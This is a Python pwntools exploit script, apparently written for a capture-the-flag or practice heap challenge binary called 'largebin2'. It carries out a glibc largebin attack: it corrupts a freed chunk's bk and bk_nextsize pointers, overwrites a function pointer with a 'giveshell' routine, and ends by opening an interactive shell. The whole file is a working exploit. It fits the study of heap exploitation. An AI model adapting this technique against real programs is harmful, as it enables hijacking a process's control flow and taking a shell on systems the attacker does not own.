# largebin2.py
from pwn import *
context.log_level = 'debug' 
p = process("./largebin2")
elf = ELF('./largebin2')
def add(size):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(size))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def edit(idx,data):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
	print p.sendafter("Data",str(data))

add(0x320) # 0 => smallbin(unsortedbin)
add(0x100) # 1 => no merge
add(0x400) # 2 => largebin
add(0x100) # 3 => no merge
add(0x410) # 4 => largebin(unsortedbin)
add(0x100) # 5 => no merge
pause()
free(0) # unsortedbin -> 0
pause()
free(2) # unsortedbin -> 0 -> 2
pause()
add(0x100) # unsortedbin -> 0, largebin -> 2
pause()
free(4) # unsortedbin -> 0 -> 4, largebin -> 2

payload = p64(0) + p64(elf.symbols['c']-(2*8))
payload += p64(0) + p64(elf.symbols['c']-(4*8)) + '\n'
pause()
edit(2, payload) 
pause()
add(0x100) # 7

payload2 = 'A'*(0x20-0x10) # name(0x20) -  sizeof(prev_size, size)0x10
payload2 += p64(0) # count
payload2 += p64(elf.symbols['giveshell']) # func
pause()
edit(4, payload2+'\n')
pause()

p.sendlineafter(">","4")
# giveshell(...)
p.interactive()